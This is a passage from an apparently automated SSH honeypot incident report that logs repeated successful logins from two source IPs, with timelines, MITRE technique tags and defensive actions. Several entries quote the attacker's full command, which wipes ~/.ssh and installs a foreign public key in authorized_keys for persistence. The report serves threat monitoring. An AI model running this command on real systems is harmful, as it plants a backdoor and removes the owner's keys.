| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:25:15` | `cowrie.session.connect` |
| `2026-04-13 09:25:15` | `cowrie.client.version` |
| `2026-04-13 09:25:15` | `cowrie.client.kex` |
| `2026-04-13 09:25:16` | `cowrie.login.success` |
| `2026-04-13 09:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeeebe01bf24

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:26 |
| **Last Seen** | 2026-04-13 09:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:26:18` | `cowrie.session.connect` |
| `2026-04-13 09:26:18` | `cowrie.client.version` |
| `2026-04-13 09:26:19` | `cowrie.client.kex` |
| `2026-04-13 09:26:20` | `cowrie.login.success` |
| `2026-04-13 09:26:21` | `cowrie.session.params` |
| `2026-04-13 09:26:21` | `cowrie.command.input` |
| `2026-04-13 09:26:21` | `cowrie.command.failed` |
| `2026-04-13 09:26:21` | `cowrie.log.closed` |
| `2026-04-13 09:26:22` | `cowrie.session.params` |
| `2026-04-13 09:26:22` | `cowrie.command.input` |
| `2026-04-13 09:26:22` | `cowrie.session.file_download` |
| `2026-04-13 09:26:22` | `cowrie.log.closed` |
| `2026-04-13 09:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-837ac8e6c11c

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:26 |
| **Last Seen** | 2026-04-13 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:26:26` | `cowrie.session.connect` |
| `2026-04-13 09:26:26` | `cowrie.client.version` |
| `2026-04-13 09:26:26` | `cowrie.client.kex` |
| `2026-04-13 09:26:27` | `cowrie.login.success` |
| `2026-04-13 09:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16cdf7401361

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:30 |
| **Last Seen** | 2026-04-13 09:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:30:00` | `cowrie.session.connect` |
| `2026-04-13 09:30:00` | `cowrie.client.version` |
| `2026-04-13 09:30:00` | `cowrie.client.kex` |
| `2026-04-13 09:30:01` | `cowrie.login.success` |
| `2026-04-13 09:30:01` | `cowrie.session.params` |
| `2026-04-13 09:30:01` | `cowrie.command.input` |
| `2026-04-13 09:30:01` | `cowrie.command.failed` |
| `2026-04-13 09:30:01` | `cowrie.log.closed` |
| `2026-04-13 09:30:02` | `cowrie.session.params` |
| `2026-04-13 09:30:02` | `cowrie.command.input` |
| `2026-04-13 09:30:02` | `cowrie.session.file_download` |
| `2026-04-13 09:30:02` | `cowrie.log.closed` |
| `2026-04-13 09:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeaf5c3b4d62

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:30 |
| **Last Seen** | 2026-04-13 09:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:30:04` | `cowrie.session.connect` |
| `2026-04-13 09:30:04` | `cowrie.client.version` |
| `2026-04-13 09:30:04` | `cowrie.client.kex` |
| `2026-04-13 09:30:05` | `cowrie.login.success` |
| `2026-04-13 09:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b80865c7b5d9

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:30 |
| **Last Seen** | 2026-04-13 09:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:30:22` | `cowrie.session.connect` |
| `2026-04-13 09:30:22` | `cowrie.client.version` |
| `2026-04-13 09:30:22` | `cowrie.client.kex` |
| `2026-04-13 09:30:23` | `cowrie.login.success` |
| `2026-04-13 09:30:24` | `cowrie.session.params` |
| `2026-04-13 09:30:24` | `cowrie.command.input` |
| `2026-04-13 09:30:24` | `cowrie.command.failed` |
| `2026-04-13 09:30:24` | `cowrie.log.closed` |
| `2026-04-13 09:30:25` | `cowrie.session.params` |
| `2026-04-13 09:30:25` | `cowrie.command.input` |
| `2026-04-13 09:30:25` | `cowrie.session.file_download` |
| `2026-04-13 09:30:25` | `cowrie.log.closed` |
| `2026-04-13 09:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ae42e1b459

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:30 |
| **Last Seen** | 2026-04-13 09:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:30:29` | `cowrie.session.connect` |
| `2026-04-13 09:30:29` | `cowrie.client.version` |
| `2026-04-13 09:30:29` | `cowrie.client.kex` |
| `2026-04-13 09:30:30` | `cowrie.login.success` |
| `2026-04-13 09:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df94494ff7a4

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:33 |
| **Last Seen** | 2026-04-13 09:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:33:12` | `cowrie.session.connect` |
| `2026-04-13 09:33:12` | `cowrie.client.version` |
| `2026-04-13 09:33:12` | `cowrie.client.kex` |
| `2026-04-13 09:33:13` | `cowrie.login.success` |
| `2026-04-13 09:33:13` | `cowrie.session.params` |
| `2026-04-13 09:33:13` | `cowrie.command.input` |
| `2026-04-13 09:33:13` | `cowrie.command.failed` |
| `2026-04-13 09:33:13` | `cowrie.log.closed` |
| `2026-04-13 09:33:14` | `cowrie.session.params` |
| `2026-04-13 09:33:14` | `cowrie.command.input` |
| `2026-04-13 09:33:14` | `cowrie.session.file_download` |
| `2026-04-13 09:33:14` | `cowrie.log.closed` |
| `2026-04-13 09:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dffe92b71f8a

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:33 |
| **Last Seen** | 2026-04-13 09:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:33:13` | `cowrie.session.connect` |
| `2026-04-13 09:33:13` | `cowrie.client.version` |
| `2026-04-13 09:33:13` | `cowrie.client.kex` |
| `2026-04-13 09:33:14` | `cowrie.login.success` |
| `2026-04-13 09:33:15` | `cowrie.session.params` |
| `2026-04-13 09:33:15` | `cowrie.command.input` |
| `2026-04-13 09:33:15` | `cowrie.command.failed` |
| `2026-04-13 09:33:15` | `cowrie.log.closed` |
| `2026-04-13 09:33:16` | `cowrie.session.params` |
| `2026-04-13 09:33:16` | `cowrie.command.input` |
| `2026-04-13 09:33:16` | `cowrie.session.file_download` |
| `2026-04-13 09:33:16` | `cowrie.log.closed` |
| `2026-04-13 09:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c88defb4886

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:33 |
| **Last Seen** | 2026-04-13 09:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:33:16` | `cowrie.session.connect` |
| `2026-04-13 09:33:16` | `cowrie.client.version` |
| `2026-04-13 09:33:16` | `cowrie.client.kex` |
| `2026-04-13 09:33:17` | `cowrie.login.success` |
| `2026-04-13 09:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2278835a96dd

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:33 |
| **Last Seen** | 2026-04-13 09:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:33:20` | `cowrie.session.connect` |
| `2026-04-13 09:33:20` | `cowrie.client.version` |
| `2026-04-13 09:33:20` | `cowrie.client.kex` |
| `2026-04-13 09:33:21` | `cowrie.login.success` |
| `2026-04-13 09:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d6615c29df

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:35 |
| **Last Seen** | 2026-04-13 09:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:35:57` | `cowrie.session.connect` |
| `2026-04-13 09:35:57` | `cowrie.client.version` |
| `2026-04-13 09:35:57` | `cowrie.client.kex` |
| `2026-04-13 09:35:58` | `cowrie.login.success` |
| `2026-04-13 09:35:59` | `cowrie.session.params` |
| `2026-04-13 09:35:59` | `cowrie.command.input` |
| `2026-04-13 09:35:59` | `cowrie.command.failed` |
| `2026-04-13 09:35:59` | `cowrie.log.closed` |
| `2026-04-13 09:36:00` | `cowrie.session.params` |
| `2026-04-13 09:36:00` | `cowrie.command.input` |
| `2026-04-13 09:36:00` | `cowrie.session.file_download` |
| `2026-04-13 09:36:00` | `cowrie.log.closed` |
| `2026-04-13 09:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c057dcd2dc61

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:36 |
| **Last Seen** | 2026-04-13 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:36:04` | `cowrie.session.connect` |
| `2026-04-13 09:36:04` | `cowrie.client.version` |
| `2026-04-13 09:36:04` | `cowrie.client.kex` |
| `2026-04-13 09:36:05` | `cowrie.login.success` |
| `2026-04-13 09:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78599c27390f

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:38 |
| **Last Seen** | 2026-04-13 09:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:38:57` | `cowrie.session.connect` |
| `2026-04-13 09:38:57` | `cowrie.client.version` |
| `2026-04-13 09:38:58` | `cowrie.client.kex` |
| `2026-04-13 09:38:59` | `cowrie.login.success` |
| `2026-04-13 09:38:59` | `cowrie.session.params` |
| `2026-04-13 09:38:59` | `cowrie.command.input` |
| `2026-04-13 09:38:59` | `cowrie.command.failed` |
| `2026-04-13 09:39:00` | `cowrie.log.closed` |
| `2026-04-13 09:39:01` | `cowrie.session.params` |
| `2026-04-13 09:39:01` | `cowrie.command.input` |
| `2026-04-13 09:39:01` | `cowrie.session.file_download` |
| `2026-04-13 09:39:01` | `cowrie.log.closed` |
| `2026-04-13 09:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69fa7d2dacb5

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:39 |
| **Last Seen** | 2026-04-13 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:39:04` | `cowrie.session.connect` |
| `2026-04-13 09:39:04` | `cowrie.client.version` |
| `2026-04-13 09:39:05` | `cowrie.client.kex` |
| `2026-04-13 09:39:06` | `cowrie.login.success` |
| `2026-04-13 09:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eec4b0fa2e60

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:39 |
| **Last Seen** | 2026-04-13 09:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:39:38` | `cowrie.session.connect` |
| `2026-04-13 09:39:38` | `cowrie.client.version` |
| `2026-04-13 09:39:39` | `cowrie.client.kex` |
| `2026-04-13 09:39:39` | `cowrie.login.success` |
| `2026-04-13 09:39:39` | `cowrie.session.params` |
| `2026-04-13 09:39:39` | `cowrie.command.input` |
| `2026-04-13 09:39:39` | `cowrie.command.failed` |
| `2026-04-13 09:39:40` | `cowrie.log.closed` |
| `2026-04-13 09:39:40` | `cowrie.session.params` |
| `2026-04-13 09:39:40` | `cowrie.command.input` |
| `2026-04-13 09:39:40` | `cowrie.session.file_download` |
| `2026-04-13 09:39:40` | `cowrie.log.closed` |
| `2026-04-13 09:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f398807e235

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:39 |
| **Last Seen** | 2026-04-13 09:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:39:42` | `cowrie.session.connect` |
| `2026-04-13 09:39:42` | `cowrie.client.version` |
| `2026-04-13 09:39:42` | `cowrie.client.kex` |
| `2026-04-13 09:39:43` | `cowrie.login.success` |
| `2026-04-13 09:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5103ce3fddfb

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:40 |
| **Last Seen** | 2026-04-13 09:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
